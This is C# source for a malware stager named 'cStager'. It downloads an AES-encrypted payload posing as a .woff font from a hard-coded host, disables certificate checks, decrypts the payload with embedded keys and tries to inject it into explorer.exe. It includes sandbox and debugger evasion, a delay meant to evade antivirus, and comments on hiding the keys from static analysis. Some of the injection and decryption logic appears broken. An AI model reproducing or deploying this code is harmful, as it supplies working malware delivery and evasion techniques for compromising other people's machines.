using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Threading;

namespace cStager
{
    class Program
    {
        private static string AESKey = "D(G+KbPeShVmYq3t"; // Base64 or XOR these in actual implementation to evade static analysis
        private static string AESIV = "8y/B?E(G+KbPeShV";
        private static string url = "http://10.10.10.6:9445/test.woff";

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, int stackZeroBits, int sizeOfStackCommit, int sizeOfStackReserve, IntPtr bytesBuffer);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern bool IsDebuggerPresent();

        // Anti-sandbox technique: simple check for common sandbox indicators
        private static bool IsSandbox()
        {
            if (Environment.MachineName == "DESKTOP-TEST" || IsDebuggerPresent()) // Add more checks if needed
            {
                return true;
            }
            return false;
        }

        public static void DownloadAndExecute()
        {
            if (IsSandbox())
            {
                Console.WriteLine("Sandbox detected. Exiting.");
                return; // Exit if sandbox environment detected
            }

            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            WebClient client = new WebClient();
            byte[] shellcode = client.DownloadData(url);

            List<byte> l = new List<byte> { };

            for (int i = 16; i <= shellcode.Length - 1; i++)  // Adjust to strip potential headers if needed
            {
                l.Add(shellcode[i]);
            }

            byte[] actual = l.ToArray();
            byte[] decrypted = Decrypt(actual, AESKey, AESIV);

            InjectIntoLegitProcess(decrypted); // New injection technique into legitimate process
        }

        private static void InjectIntoLegitProcess(byte[] shellcode)
        {
            // Find a legitimate process to inject into, e.g., explorer.exe
            Process[] explorer = Process.GetProcessesByName("explorer");
            if (explorer.Length == 0)
            {
                Console.WriteLine("Explorer not found, aborting.");
                return;
            }

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorer[0].Id); // Full access rights to target process

            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40); // Memory allocation for shellcode
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            IntPtr hThread;
            NtCreateThreadEx(out hThread, 0x1FFFFF, IntPtr.Zero, hProcess, addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF); // Wait for shellcode execution
            CloseHandle(hProcess);
        }

        private static byte[] Decrypt(byte[] ciphertext, string AESKey, string AESIV)
        {
            byte[] key = Encoding.UTF8.GetBytes(AESKey);
            byte[] IV = Encoding.UTF8.GetBytes(AESIV);

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = IV;
                aesAlg.Padding = PaddingMode.None;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream memoryStream = new MemoryStream(ciphertext))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(ciphertext, 0, ciphertext.Length);
                        return memoryStream.ToArray();
                    }
                }
            }
        }

        public static void Main(string[] args)
        {
            Thread.Sleep(5000); // Simple delay as anti-sandbox/AV evasion

            DownloadAndExecute();
        }
    }
}
